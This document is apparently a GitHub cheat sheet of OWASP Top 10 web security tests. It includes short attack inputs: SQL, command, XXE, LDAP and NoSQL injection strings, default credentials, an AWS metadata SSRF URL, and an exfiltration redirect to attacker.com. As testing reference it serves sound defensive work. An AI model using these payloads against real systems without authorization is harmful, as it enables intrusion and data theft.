

# <img src="https://github.com/Xwal13/OWASP-TOP-10-WEB-SHEET-CHEAT/raw/main/Simpleicons-Team-Simple-Owasp.svg" alt="Custom Icon" width="60" height="60"> OWASP Top 10 Cheat Sheet

---

## 1️⃣ Broken Access Control 🔓  
1. 🆔 **IDOR:** Test if IDs in URLs can access unauthorized data.  
2. 🚫 **Access Control Bypass:** Check restricted pages/APIs.  
3. 🔄 **HTTP Methods:** Test unauthorized methods (PUT, DELETE).  
4. 🕵️ **Forced Browsing:** Access hidden endpoints/admin panels.  
5. 🛠️ **Privilege Escalation:** Check if lower-privilege users can perform admin actions.  

---

## 2️⃣ Cryptographic Failures 🔒  
1. 🗝️ **Hardcoded Secrets:** Check `.env`, `.git` for sensitive keys.  
2. 🛠️ **Weak Algorithms:** Identify MD5, SHA-1, DES in code.  
3. 📡 **Plaintext Transmission:** Detect HTTP transmissions of sensitive data.  
4. 🔐 **Insecure Key Storage:** Find keys in public files/logs.  
5. 🎲 **Predictable Keys:** Verify keys are 32 bytes and random.  
6. 🔄 **Static IV Usage:** Ensure IVs are random and unique.  
7. 🚩 **Missing Signature Validation:** Decode JWT tokens; flag `alg: none`.  

---

## 3️⃣ Security Misconfigurations 🛠️  
1. 🛡️ **Default Credentials:** `admin:admin`, `root:toor`.  
2. 📁 **Sensitive Files:** Check `/robots.txt`, `.env`, `.git`.  
3. 🚪 **Access Control:** Verify `/admin`, `/backup`.  
4. ❗ **Verbose Errors:** Trigger errors with `'`, `\"`, `<script>`.  
5. 🛑 **HTTP Headers:** Check CSP, HSTS, `X-Frame-Options`.  
6. 📡 **Unnecessary Services:** Scan with `nmap` for outdated services.  
7. 🕒 **Outdated Software:** Check versions and CVEs.  

---

## 4️⃣ File Name Enumeration 📂  
- 🔍 **Locate Endpoint:** Identify file path handling endpoints.  
- 🛠️ **Baseline Test:** Request sensitive files like `/etc/passwd`.  
- 🔄 **Modified Request:** Append `_DOESNTEXIST` to file paths.  
- ⚖️ **Compare Responses:** Check error messages for clues.  

---

## 5️⃣ Injection Attacks 💉  
1. 🗄️ **SQL Injection:** Test with `' OR '1'='1' --` and `sqlmap`.  
2. 🖥️ **Command Injection:** Inject `; whoami` or `&& ls`.  
3. 📄 **XXE Injection:** Use `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.  
4. 📚 **LDAP Injection:** Test with `*)(uid=*)`.  
5. 📦 **NoSQL Injection:** Inject `{"$ne": null}` or `{"$gt": ""}`.  

---

## 6️⃣ Insecure Design 🏗️  
1. 🔄 **Business Logic Flaws:** Bypass limits, reorder actions.  
2. 🚪 **Access Control Gaps:** Access admin functions as a user.  
3. 🔗 **Open Redirects:** Test `/redirect?url=http://evil.com`.  
4. 📋 **Predictable Endpoints:** Enumerate `/admin`, `/backup`.  

---

## 7️⃣ Security Logging & Monitoring Failures 📊  
1. 📝 **Insufficient Logging:** Check if auth and admin actions are logged.  
2. 🔓 **Unprotected Logs:** Look for plaintext passwords or tokens.  
3. 🚨 **No Alerts:** Verify alerts for failed logins or privilege escalation.  
4. 🕒 **Audit Trails:** Ensure critical actions are logged.  

---

## 8️⃣ SSRF (Server-Side Request Forgery) 🌐  
1. 🏠 **Internal Access:** Test URLs like `http://127.0.0.1/admin`.  
2. ☁️ **AWS Metadata:** Use `http://169.254.169.254/latest/meta-data/`.  
3. 📡 **Port Scanning:** Test with `http://127.0.0.1:22`.  
4. 🌍 **Data Exfiltration:** Redirect to `http://attacker.com/?data=<sensitive-data>`.  

---

## 9️⃣ Software & Data Integrity Failures 🛠️  
1. 🔒 **Update Integrity:** Verify checksums or signatures for updates.  
2. 🏗️ **CI/CD Security:** Test exposed CI/CD tools.  
3. 📦 **Third-Party Components:** Check if plugins are from trusted sources.  
4. ⚠️ **Deserialization Risks:** Test endpoints handling untrusted data.  

---

## 🔟 Identification & Authentication Failures 🔑  
1. 🔓 **Password Policies:** Test for weak passwords.  
2. 🔐 **MFA:** Check if enforced for sensitive accounts.  
3. 🕵️ **Username Enumeration:** Test login error messages.  
4. 🕒 **Session Security:** Verify token rotation and expiry.  

---

## 1️⃣1️⃣ Vulnerable & Outdated Components 🛠️  
1. 🆕 **Check for Updates:** Verify if libraries are up-to-date.  
2. 🛡️ **Patch Management:** Check if patches are applied.  
3. 🗑️ **EOL Software:** Identify and replace unsupported versions.  
4. 🔍 **Vulnerability Scanning:** Use Dependabot or OWASP Dependency-Check.  

---



## 📚 References

1. [OWASP Official Website](https://owasp.org/) 🌐  
2. [OWASP Top 10 Documentation](https://owasp.org/www-project-top-ten/) 📄  
3. [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) 📋

